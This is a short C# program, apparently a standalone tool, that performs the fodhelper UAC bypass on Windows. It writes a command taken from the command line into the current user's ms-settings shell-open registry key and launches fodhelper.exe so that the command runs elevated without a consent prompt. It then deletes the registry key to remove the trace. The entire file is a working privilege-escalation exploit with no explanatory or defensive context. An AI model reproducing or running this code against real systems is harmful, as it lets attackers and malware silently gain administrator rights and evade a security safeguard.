using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace UACBypassFod
{
    class Program
    {
        static void Main(string[] args)
        {
            string cmd = args[0];
            var key = Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\Shell\\Open\\command");
            key.SetValue("", cmd);
            key.SetValue("DelegateExecute", "");
            Process.Start(@"C:\Windows\System32\fodhelper.exe");
            System.Threading.Thread.Sleep(1000);
            Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\ms-settings");
        }
    }
}
